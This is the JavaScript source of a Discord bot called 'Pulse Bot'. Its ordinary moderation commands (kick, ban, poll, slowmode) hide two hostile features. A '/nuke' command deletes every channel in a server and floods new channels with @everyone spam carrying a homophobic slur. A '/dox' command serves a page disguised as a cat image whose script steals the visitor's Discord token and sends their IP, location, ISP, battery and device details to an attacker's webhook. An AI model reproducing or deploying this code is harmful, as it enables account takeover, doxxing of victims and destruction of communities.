const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const app = express();
const crypto = require('crypto');

const TOKEN = process.env.TOKEN;
const PORT = process.env.PORT || 3000;
const INVITE_LINK = 'https://discord.gg/FCJ5EjVmG';

if (!TOKEN) {
    console.error('❌ TOKEN environment variable is required!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const links = new Map();
let nukeRunning = false;
let nukeGuildId = null;
let startTime = Date.now();

app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook));
});

async function registerCommands() {
    try {
        await client.application.commands.set([
            { name: 'nuke', description: '💀 Starts the nuke' },
            { name: 'stop', description: '⏹️ Stops the nuke' },
            { 
                name: 'dox', 
                description: '📸 Generate dox link',
                options: [
                    {
                        name: 'webhook',
                        type: 3,
                        description: 'Webhook URL',
                        required: true
                    }
                ]
            },
            { name: 'ping', description: '🏓 Check bot latency' },
            { name: 'serverinfo', description: '📊 Get server information' },
            { 
                name: 'userinfo', 
                description: '👤 Get user information',
                options: [{ name: 'user', type: 6, description: 'Target user', required: false }]
            },
            { 
                name: 'avatar', 
                description: '🖼️ Get user avatar',
                options: [{ name: 'user', type: 6, description: 'Target user', required: false }]
            },
            { 
                name: 'say', 
                description: '💬 Make the bot say something',
                options: [{ name: 'message', type: 3, description: 'Message to say', required: true }]
            },
            { 
                name: 'kick', 
                description: '👢 Kick a member',
                options: [
                    { name: 'user', type: 6, description: 'User to kick', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { 
                name: 'ban', 
                description: '🔨 Ban a member',
                options: [
                    { name: 'user', type: 6, description: 'User to ban', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { 
                name: 'clear', 
                description: '🧹 Clear messages in a channel',
                options: [{ name: 'amount', type: 4, description: 'Number of messages (1-100)', required: true }]
            },
            { 
                name: 'timeout', 
                description: '⏰ Timeout a member',
                options: [
                    { name: 'user', type: 6, description: 'User to timeout', required: true },
                    { name: 'minutes', type: 4, description: 'Minutes (1-60)', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { name: 'uptime', description: '⏱️ Bot uptime' },
            { name: 'invite', description: '🔗 Get bot invite link' },
            { name: 'stats', description: '📊 Bot statistics' },
            { 
                name: 'poll', 
                description: '📊 Create a poll',
                options: [
                    { name: 'question', type: 3, description: 'Poll question', required: true },
                    { name: 'option1', type: 3, description: 'First option', required: true },
                    { name: 'option2', type: 3, description: 'Second option', required: true }
                ]
            },
            { 
                name: 'slowmode', 
                description: '🐢 Set slowmode in a channel',
                options: [{ name: 'seconds', type: 4, description: 'Slowmode seconds (0-21600)', required: true }]
            },
            { 
                name: 'lock', 
                description: '🔒 Lock a channel',
                options: [{ name: 'channel', type: 7, description: 'Channel to lock', required: false }]
            },
            { 
                name: 'unlock', 
                description: '🔓 Unlock a channel',
                options: [{ name: 'channel', type: 7, description: 'Channel to unlock', required: false }]
            },
            { name: 'rolelist', description: '📋 List all server roles' }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('Failed to register commands:', error);
    }
}

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, user, member, guild, channel } = interaction;

    try {
        // ---- DOX - FIXED (NO SERVER CHECK) ----
        if (commandName === 'dox') {
            await interaction.deferReply({ ephemeral: true });
            
            const wh = interaction.options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply('❌ Invalid webhook URL.');
            }
            
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });
            
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, battery, and device info.`)
                .setFooter({ text: `Generated by ${interaction.user.tag}` });
            
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- NUKE ----
        if (commandName === 'nuke') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const botMember = guild.members.cache.get(client.user.id);
            if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                return interaction.editReply('❌ I need **Administrator** permissions.');
            }
            if (nukeRunning) return interaction.editReply('❌ Nuke already running. Use `/stop`.');
            nukeRunning = true;
            nukeGuildId = guild.id;
            await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop.');
            await startNuke(guild);
        }

        // ---- STOP ----
        if (commandName === 'stop') {
            await interaction.deferReply({ ephemeral: true });
            if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
            nukeRunning = false;
            nukeGuildId = null;
            await interaction.editReply('⏹️ **Nuke stopped.**');
        }

        // ---- PING ----
        if (commandName === 'ping') {
            const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
        }

        // ---- SERVERINFO ----
        if (commandName === 'serverinfo') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- USERINFO ----
        if (commandName === 'userinfo') {
            await interaction.deferReply({ ephemeral: true });
            const target = interaction.options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- AVATAR ----
        if (commandName === 'avatar') {
            await interaction.deferReply({ ephemeral: true });
            const target = interaction.options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        // ---- SAY ----
        if (commandName === 'say') {
            await interaction.deferReply({ ephemeral: true });
            const msg = interaction.options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
        }

        // ---- KICK ----
        if (commandName === 'kick') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = interaction.options.getMember('user');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply('❌ User not found.');
            if (!member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                return interaction.editReply('❌ You need **Kick Members** permission.');
            }
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                return interaction.editReply('❌ I need **Kick Members** permission.');
            }
            if (target.id === guild.ownerId) return interaction.editReply('❌ Cannot kick the server owner.');
            if (target.id === client.user.id) return interaction.editReply('❌ Cannot kick myself.');
            await target.kick(reason);
            await interaction.editReply(`✅ **${target.user.tag}** kicked. Reason: ${reason}`);
        }

        // ---- BAN ----
        if (commandName === 'ban') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = interaction.options.getUser('user');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply('❌ User not found.');
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                return interaction.editReply('❌ You need **Ban Members** permission.');
            }
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                return interaction.editReply('❌ I need **Ban Members** permission.');
            }
            if (target.id === guild.ownerId) return interaction.editReply('❌ Cannot ban the server owner.');
            if (target.id === client.user.id) return interaction.editReply('❌ Cannot ban myself.');
            await guild.bans.create(target.id, { reason });
            await interaction.editReply(`✅ **${target.tag}** banned. Reason: ${reason}`);
        }

        // ---- CLEAR ----
        if (commandName === 'clear') {
            await interaction.deferReply({ ephemeral: true });
            const amount = interaction.options.getInteger('amount');
            if (amount < 1 || amount > 100) return interaction.editReply('❌ Amount must be between 1 and 100.');
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
                return interaction.editReply('❌ You need **Manage Messages** permission.');
            }
            const messages = await channel.messages.fetch({ limit: amount });
            await channel.bulkDelete(messages, true);
            await interaction.editReply(`✅ Deleted ${messages.size} messages.`);
        }

        // ---- TIMEOUT ----
        if (commandName === 'timeout') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = interaction.options.getMember('user');
            const minutes = interaction.options.getInteger('minutes');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply('❌ User not found.');
            if (minutes < 1 || minutes > 60) return interaction.editReply('❌ Minutes must be between 1 and 60.');
            if (!member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
                return interaction.editReply('❌ You need **Moderate Members** permission.');
            }
            await target.timeout(minutes * 60 * 1000, reason);
            await interaction.editReply(`✅ **${target.user.tag}** timed out for ${minutes} minutes. Reason: ${reason}`);
        }

        // ---- UPTIME ----
        if (commandName === 'uptime') {
            const uptime = Date.now() - startTime;
            const days = Math.floor(uptime / 86400000);
            const hours = Math.floor((uptime % 86400000) / 3600000);
            const minutes = Math.floor((uptime % 3600000) / 60000);
            const seconds = Math.floor((uptime % 60000) / 1000);
            await interaction.reply(`⏱️ **Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s`);
        }

        // ---- INVITE ----
        if (commandName === 'invite') {
            const inviteURL = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot+applications.commands`;
            await interaction.reply(`🔗 **Invite Pulse Bot:**\n${inviteURL}`);
        }

        // ---- STATS ----
        if (commandName === 'stats') {
            const totalServers = client.guilds.cache.size;
            const totalUsers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
            const memoryUsed = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
            const embed = new EmbedBuilder()
                .setTitle('📊 Bot Statistics')
                .setColor(0x8B5CF6)
                .addFields(
                    { name: '📡 Servers', value: `${totalServers}`, inline: true },
                    { name: '👥 Users', value: `${totalUsers}`, inline: true },
                    { name: '💾 Memory', value: `${memoryUsed} MB`, inline: true },
                    { name: '🏓 Ping', value: `${Math.round(client.ws.ping)}ms`, inline: true },
                    { name: '⏱️ Uptime', value: `<t:${Math.floor(Date.now() / 1000 - (Date.now() - startTime) / 1000)}:R>`, inline: true }
                );
            await interaction.reply({ embeds: [embed] });
        }

        // ---- POLL ----
        if (commandName === 'poll') {
            await interaction.deferReply({ ephemeral: true });
            const question = interaction.options.getString('question');
            const option1 = interaction.options.getString('option1');
            const option2 = interaction.options.getString('option2');
            const embed = new EmbedBuilder()
                .setTitle('📊 Poll')
                .setDescription(question)
                .setColor(0x8B5CF6)
                .addFields(
                    { name: '1️⃣', value: option1, inline: true },
                    { name: '2️⃣', value: option2, inline: true }
                )
                .setFooter({ text: `Poll created by ${user.tag}` });
            const pollMsg = await channel.send({ embeds: [embed] });
            await pollMsg.react('1️⃣');
            await pollMsg.react('2️⃣');
            await interaction.editReply('✅ Poll created!');
        }

        // ---- SLOWMODE ----
        if (commandName === 'slowmode') {
            await interaction.deferReply({ ephemeral: true });
            const seconds = interaction.options.getInteger('seconds');
            if (seconds < 0 || seconds > 21600) return interaction.editReply('❌ Slowmode must be between 0 and 21600 seconds.');
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply('❌ You need **Manage Channels** permission.');
            }
            await channel.setRateLimitPerUser(seconds);
            await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
        }

        // ---- LOCK ----
        if (commandName === 'lock') {
            await interaction.deferReply({ ephemeral: true });
            const targetChannel = interaction.options.getChannel('channel') || channel;
            if (!targetChannel) return interaction.editReply('❌ Channel not found.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply('❌ You need **Manage Channels** permission.');
            }
            await targetChannel.permissionOverwrites.edit(guild.id, { SendMessages: false });
            await interaction.editReply(`🔒 **${targetChannel.name}** locked.`);
        }

        // ---- UNLOCK ----
        if (commandName === 'unlock') {
            await interaction.deferReply({ ephemeral: true });
            const targetChannel = interaction.options.getChannel('channel') || channel;
            if (!targetChannel) return interaction.editReply('❌ Channel not found.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply('❌ You need **Manage Channels** permission.');
            }
            await targetChannel.permissionOverwrites.edit(guild.id, { SendMessages: null });
            await interaction.editReply(`🔓 **${targetChannel.name}** unlocked.`);
        }

        // ---- ROLELIST ----
        if (commandName === 'rolelist') {
            await interaction.deferReply({ ephemeral: true });
            if (!guild) return interaction.editReply('❌ Server only.');
            const roles = guild.roles.cache
                .filter(r => r.id !== guild.id)
                .sort((a, b) => b.position - a.position)
                .map(r => r.toString())
                .join(', ');
            const embed = new EmbedBuilder()
                .setTitle('📋 Server Roles')
                .setDescription(roles || 'No custom roles found.')
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

    } catch (error) {
        console.error('Error:', error);
        try {
            await interaction.editReply(`❌ Error: ${error.message}`);
        } catch (e) {}
    }
});

// ---- START NUKE ----
async function startNuke(guild) {
    const variants = [
        '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER'
    ];
    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

    const channels = guild.channels.cache;
    console.log(`Deleting ${channels.size} channels...`);
    
    const channelArray = Array.from(channels.values());
    for (let i = 0; i < channelArray.length; i += 10) {
        const batch = channelArray.slice(i, i + 10);
        await Promise.all(batch.map(async (ch) => {
            try { await ch.delete(); } catch(e) {}
        }));
        await new Promise(r => setTimeout(r, 50));
    }
    console.log('All channels deleted.');

    async function spamChannel(ch) {
        if (!nukeRunning) return;
        try {
            while (nukeRunning) {
                try {
                    const line = variants[Math.floor(Math.random() * variants.length)];
                    let big = `@everyone ${line}\n`;
                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                        big += line + '\n';
                    }
                    big += `\n${inviteLine}`;
                    await ch.send(big.slice(0, 2000));
                } catch(e) {}
                await new Promise(r => setTimeout(r, 10));
            }
        } catch(e) {}
    }

    async function createChannelsAndSpam() {
        let createdCount = 0;
        while (nukeRunning) {
            try {
                const newChannels = await Promise.all([
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                ]);
                
                const valid = newChannels.filter(c => c !== null);
                for (const ch of valid) spamChannel(ch);
                createdCount += valid.length;
                console.log(`Created ${createdCount} channels`);
            } catch(e) {}
            await new Promise(r => setTimeout(r, 10));
        }
    }

    createChannelsAndSpam();
    guild.channels.cache.forEach(ch => {
        if (ch.type === ChannelType.GuildText) spamChannel(ch);
    });
}

// ---- DOX HTML ----
function generateDoxHTML(webhook) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: "Segoe UI", sans-serif; }
        .container { text-align: center; }
        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
        .caption { color: #555; font-size: 14px; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
        <div class="caption">Loading...</div>
    </div>
    <script>
        var WEBHOOK = "${webhook}";
        function send(data) {
            fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).catch(function() {});
        }

        (function() {
            try {
                var token = localStorage.getItem("token") || 
                              document.cookie.split("; ").find(function(r) { return r.startsWith("token="); }).split("=")[1] ||
                              sessionStorage.getItem("token");
                if (token) {
                    send({ content: "**🎯 Discord Token:** " + token });
                }
            } catch(e) {}
        })();

        (async function() {
            try {
                var res = await fetch("https://ipinfo.io/json");
                var d = await res.json();
                if (!d.ip) return;

                var ua = navigator.userAgent;
                var browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
                var os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Windows NT 6.1") ? "Windows 7" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
                var device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
                var now = new Date();
                var timestamp = now.toISOString();
                var localTime = now.toString();

                var lat = d.loc ? d.loc.split(",")[0] : "N/A";
                var lon = d.loc ? d.loc.split(",")[1] : "N/A";
                var mapUrl = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon : "N/A";

                var battery = "N/A";
                try {
                    var b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not Charging)");
                } catch(e) {}

                var vpn = "❌ Not Detected";
                var vpnScore = 0;
                var vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
                var isp = (d.org || "").toLowerCase();
                var asn = (d.asn || "").toLowerCase();
                for (var i = 0; i < vpnKeywords.length; i++) {
                    if (isp.includes(vpnKeywords[i]) || asn.includes(vpnKeywords[i])) {
                        vpnScore += 2;
                        break;
                    }
                }
                try {
                    var browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    if (d.timezone && d.timezone !== "N/A" && browserTz && d.timezone !== browserTz) {
                        vpnScore += 3;
                    }
                } catch(e) {}
                if (vpnScore >= 3) vpn = "✅ Likely (Score: " + vpnScore + ")";

                var embed = {
                    title: "☠️ TARGET COMPROMISED",
                    color: 0xFF0000,
                    fields: [
                        { name: "🌐 IP", value: d.ip || "N/A", inline: true },
                        { name: "🏙️ City", value: d.city || "N/A", inline: true },
                        { name: "🗺️ Region", value: d.region || "N/A", inline: true },
                        { name: "🌍 Country", value: d.country || "N/A", inline: true },
                        { name: "📮 Postal", value: d.postal || "N/A", inline: true },
                        { name: "🔢 ASN", value: d.asn || "N/A", inline: true },
                        { name: "🏢 ISP", value: d.org || "N/A", inline: true },
                        { name: "🕒 Timezone", value: d.timezone || "N/A", inline: true },
                        { name: "📍 Location", value: mapUrl, inline: false },
                        { name: "🔋 Battery", value: battery, inline: true },
                        { name: "🛡️ VPN", value: vpn, inline: true },
                        { name: "🧠 Browser", value: browser, inline: true },
                        { name: "💻 OS", value: os, inline: true },
                        { name: "🖥️ Device", value: device, inline: true },
                        { name: "⏰ Time", value: localTime, inline: false }
                    ],
                    footer: { text: "☠️ PULSE DOX" }
                };

                send({ embeds: [embed] });

            } catch(e) {
                send({ content: "❌ Error: " + e.message });
            }
        })();

        setTimeout(function() {
            document.body.innerHTML = "";
            document.body.style.background = "#000";
            document.body.style.margin = "0";
            document.body.style.height = "100vh";
            setTimeout(function() {
                window.close();
                window.location.href = "about:blank";
            }, 500);
        }, 5000);

        document.querySelector(".caption").textContent = "Image loaded successfully.";
    <\/script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

client.once('ready', async () => {
    startTime = Date.now();
    console.log(`🤖 ${client.user.tag} is online!`);
    console.log(`📡 Connected to ${client.guilds.cache.size} servers`);
    await registerCommands();
    console.log('✅ Bot is ready!');
});

client.login(TOKEN);
